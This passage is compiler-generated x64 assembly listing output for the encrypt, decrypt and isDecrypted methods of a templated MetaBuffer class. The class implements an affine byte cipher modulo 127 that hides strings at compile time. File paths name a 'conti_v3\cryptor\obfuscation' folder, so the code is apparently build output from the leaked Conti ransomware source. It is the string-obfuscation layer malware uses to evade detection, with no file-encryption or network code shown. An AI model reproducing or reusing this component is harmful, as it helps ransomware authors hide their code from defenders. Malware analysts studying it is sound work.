  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 79	 sub	 eax, 121		; 00000079H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 79	 add	 r8d, 121		; 00000079H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 54 00 00 00	 mov	 ecx, 84			; 00000054H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4b 00 00 00	 mov	 ecx, 75			; 0000004bH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 34 00 00 00	 mov	 ecx, 52			; 00000034H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 34	 add	 r8d, 52			; 00000034H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 63 00 00 00	 mov	 ecx, 99			; 00000063H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 63	 add	 r8d, 99			; 00000063H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 30	 sub	 eax, 48			; 00000030H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
